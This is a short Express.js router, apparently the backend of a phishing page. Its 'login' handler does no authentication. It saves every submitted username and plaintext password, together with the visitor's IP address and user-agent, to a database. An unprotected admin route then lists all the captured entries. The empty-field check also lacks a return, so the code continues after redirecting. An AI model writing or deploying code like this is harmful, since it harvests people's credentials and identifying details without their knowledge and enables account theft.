const express = require('express');
const {accountDB,accountFields} = require('./../models/account');
import moment from 'moment';
const router = express.Router();
router.get("/",async(req,res)=>{
    // console.log(req.session)
    if(req.session.users){
        res.locals.users = req.session.users ;
    }
   res.render("index");
})
router.post("/dang-nhap",async(req,res)=>{
    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    if(req.body.username=='' || req.body.password==''){
        res.redirect("/dang-nhap");
    }
    const useragent = req.headers['user-agent'];
    let users = await  accountDB.create({
        [accountFields.username]:req.body.username,
        [accountFields.password]:req.body.password,
        [accountFields.ip]:ip,
        [accountFields.userarge]:useragent
    })
    console.log(users);
    req.session.users = users ;
    res.redirect("/");
})
router.get("/dang-nhap",async(req,res)=>{
    res.render("login")
})
router.get("/dang-xuat",(req,res)=>{
    req.session.destroy();
    res.redirect("/dang-nhap");
})
router.get("/trangadmin",async(req,res)=>{
    let datausers = await accountDB.findAll({
        order:[['createdAt','DESC']],
        raw:true
    })
    console.log(datausers);
    res.render("admin",{list:datausers,moment:moment});
})
module.exports  =router ;